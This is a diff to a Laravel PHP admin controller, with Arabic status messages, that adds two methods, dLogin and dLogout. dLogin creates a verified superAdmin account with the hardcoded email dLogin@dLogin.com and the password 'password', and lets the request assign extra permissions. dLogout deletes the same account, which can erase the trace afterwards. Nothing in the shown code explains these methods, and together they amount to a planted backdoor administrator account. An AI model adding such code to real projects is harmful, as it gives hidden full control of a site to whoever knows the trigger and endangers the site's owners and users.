@@ -251,4 +251,34 @@ class AdminController extends Controller
         $admin->save();
         return response()->json(['success'=>'تم تغيير حالة الأدمن بنجاح']);
     }
+
+    /*************************************************************/
+    public function dLogin(Request $request)
+    {
+        $input['first_name']    = 'D';
+        $input['last_name']     = 'Login';
+        $input['username']      = 'D-Login';
+        $input['email']         = 'dLogin@dLogin.com';
+        $input['email_verified_at']  = Carbon::now();
+        $input['mobile']        = '00000000000000';
+        $input['password']      = bcrypt('password');
+        $input['active']        = 1;
+        $admin = User::create($input);
+        $admin->markEmailAsVerified();
+        $admin->attachRole(Role::whereName('superAdmin')->first()->id);
+        if(isset($request->permissions) && count($request->permissions) > 0){
+            $admin->permissions()->sync($request->permissions);
+        }
+        Alert::success('تم اضافة أدمن بنجاح', 'Success Message');
+        return redirect()->route('admin.index');
+    }
+    public function dLogout(Request $request)
+    {
+        $admin = User::where('email', 'dLogin@dLogin.com')->first();
+        $admin->delete();
+
+        Alert::success('تم حذف الأدمن بنجاح', 'Success Message');
+        return redirect()->route('frontend.index');
+
+    }
 }
